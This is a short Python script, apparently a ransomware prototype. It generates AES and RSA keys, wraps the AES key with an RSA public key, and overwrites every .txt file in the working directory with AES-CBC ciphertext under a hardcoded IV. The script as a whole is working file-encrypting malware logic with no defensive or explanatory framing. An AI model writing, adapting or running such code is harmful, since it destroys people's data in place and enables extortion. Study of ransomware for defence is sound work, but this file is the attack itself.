#!/usr/bin/env python3
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import sys, glob
import subprocess

#Generation of the symmetric key once
skey = get_random_bytes(16)

#Generation of Private Key and Public Key(RSA) once

key = RSA.generate(2048)
private_key = key.export_key()
file_out = open("private.pem", "wb")
file_out.write(private_key)
file_out.close()
public_key = key.publickey().export_key()
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

#Generation of Another Pair of Private Key and Public Key(RSA) 

key = RSA.generate(2048)
private_key = key.export_key()
file_out = open("private2.pem", "wb")
file_out.write(private_key)
file_out.close()
public_key = key.publickey().export_key()
file_out = open("receiver2.pem", "wb")
file_out.write(public_key)
file_out.close()


#Encrypting symmetric key using RSA public key
receipient_key = RSA.import_key(open("receiver.pem").read())
cipher_rsa = PKCS1_OAEP.new(receipient_key)
enc_data = cipher_rsa.encrypt(skey)
file_out= open("encrypted_data.bin", "wb") 
file_out.write(enc_data)
file_out.close()

	
	

	
for item in glob.glob("*.txt"):
	#Basically you need to go to each text file and open it 
	# Then the encrypted symmetric key needs to be passed to the decryption program. 
	
	data_in = open(item, 'rb')
	data = data_in.read()
	data_in.close()

	 
	# Encryption of Data file using Symmetric Key
	
	file_out= open(item, "wb")	
	iv = b64decode("xdpms+Mvqvw9tMFOZv+UQQ==")
	cipher = AES.new(skey, AES.MODE_CBC,iv)
	ct_bytes = cipher.encrypt(pad(data, AES.block_size))
	
	file_out.write(ct_bytes)
	file_out.close()

	ct = b64encode(ct_bytes).decode('utf-8')
	key = b64encode(skey).decode('utf-8')
	#print(iv, ct, key)

	
	# With this iv(hardcoded, the key, and the cipher text we will be able to get the data)

	

